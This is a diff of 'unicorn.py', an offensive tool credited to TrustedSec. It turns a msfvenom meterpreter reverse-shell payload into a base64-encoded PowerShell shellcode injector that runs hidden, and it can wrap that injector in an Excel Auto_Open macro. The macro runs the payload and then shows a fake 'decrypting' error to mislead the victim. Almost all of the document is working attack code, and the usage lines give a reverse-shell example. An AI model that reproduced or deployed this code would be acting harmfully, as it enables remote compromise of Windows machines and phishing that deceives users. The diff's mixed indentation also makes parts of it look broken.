@@ -18,48 +18,46 @@ import base64
 import re
 import subprocess
 import sys
-#split string
+
+# split string
 def split_str(s, length):
     return [s[i:i+length] for i in range(0, len(s), length)]
-#generate full macro
+
+# generate full macro
 def genMacro(full_attack):
     #start of the macro
     macro_str = """Sub Auto_Open()
-Dim x
-x = """
+		Dim x
+    		x = """
     linelength = 380
     powershell_command_list = split_str(full_attack, linelength)
 
     for line in powershell_command_list:
         macro_str +=  "& \"" + line + "\" _\r\n"
 
-    #remove trailing "_ \r\n"
+    # remove trailing "_ \r\n"
     macro_str = macro_str[:-4]
-    #remove first occurence of &
+    # remove first occurence of &
     macro_str = macro_str.replace("& ","",1)
 
-    #end of macro
+    # end of macro
     macro_str += """
-Shell ("POWERSHELL.EXE " & x)
-
-Dim title As String
-title = "Critical error"
-Dim msg As String
-Dim intResponse As Integer
-msg = "An error has occurd while decrypting the file. Excel is unable to continue."
-intResponse = MsgBox(msg, 16, title)
-Application.Quit
-End Sub
-"""
+    Shell ("POWERSHELL.EXE " & x)
+    Dim title As String
+    title = "Critical error"
+    Dim msg As String
+    Dim intResponse As Integer
+    msg = "An error has occurd while decrypting the file. Excel is unable to continue."
+    intResponse = MsgBox(msg, 16, title)
+    Application.Quit
+    End Sub
+    """
     return macro_str
-
-
-
 
 # generate base shellcode
 def generate_shellcode(payload,ipaddr,port):
     port = port.replace("LPORT=", "")
-    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s -a x86 --platform windows -f c" % (payload,ipaddr,port), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     data = proc.communicate()[0]
     # start to format this a bit to get it ready
     repls = {';' : '', ' ' : '', '+' : '', '"' : '', '\n' : '', 'buf=' : '', 'Found 0 compatible encoders' : '', 'unsignedcharbuf[]=' : ''}
@@ -89,15 +87,16 @@ def format_payload(payload, ipaddr, port, macro):
     shellcode = newdata[:-1]
     
     # one line shellcode injection with native x86 shellcode
-    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = %s;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}""" %  (shellcode))
+    powershell_code = (r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $e"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $e";}""" %  (shellcode))
 
     full_attack = "powershell -nop -win hidden -noni -enc " + base64.b64encode(powershell_code.encode('utf_16_le'))  
     
-    if(macro == "macro"):
+    if macro == "macro":
         macro = genMacro(full_attack)
         filewrite = file("powershell_attack.txt", "w")
         filewrite.write(macro)
         filewrite.close()
+
     else:
         # write out powershell attacks
         filewrite = file("powershell_attack.txt", "w")
@@ -114,23 +113,26 @@ def format_payload(payload, ipaddr, port, macro):
 
 # pull the variables needed for usage
 try:
+
+    # if we are using macros
     if len(sys.argv) > 4:
         payload = sys.argv[1]
         ipaddr = sys.argv[2]
         port = sys.argv[3]
         macro = sys.argv[4]
         format_payload(payload,ipaddr,port, macro)
+
+    # regular unicorn attack
     elif len(sys.argv) > 3:
-        payload = sys.argv[1]
-        ipaddr = sys.argv[2]
-        port = sys.argv[3]
-        macro = ""
-        format_payload(payload,ipaddr,port, macro)
+        	payload = sys.argv[1]
+        	ipaddr = sys.argv[2]
+        	port = sys.argv[3]
+        	macro = ""
+        	format_payload(payload,ipaddr,port, macro)
 
-# except out of index error
-except IndexError:
-
-    print r"""
+    # if we did supply parameters
+    elif len(sys.argv) < 3:
+		print r"""
                                                          ,/
                                                         //
                                                       ,//
@@ -169,12 +171,16 @@ except IndexError:
                          |  \         \ \              I  `
                          ( __;        ( _;            ('-_';
                          |___\        \___:            \___:
-"""
-    print "--------------------Magic Unicorn Attack Vector\n\n-----------------------------"
-    print "Real quick down and dirty for native x86 powershell on any platform"
-    print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
-    print "Twitter: @TrustedSec, @HackingDave"
-    print "Happy Magic Unicorns."
-    print "\n"
-    print "Usage: python unicorn.py payload reverse_ipaddr port"
-    print "Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro"
+		"""
+		print "-------------------- Magic Unicorn Attack Vector -----------------------------"
+	        print "\nReal quick down and dirty for native x86 powershell injection on any platform"
+	        print "Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)"
+	        print "Twitter: @TrustedSec, @HackingDave"
+	        print "\nHappy Magic Unicorns."
+	        print ""
+	        print "Usage: python unicorn.py payload reverse_ipaddr port"
+	        print "Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443"
+		print "Macro Example: python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.5 443 macro"
+
+except Exception, e:
+	print "[!] Something went wrong, printing the error: " + str(e)
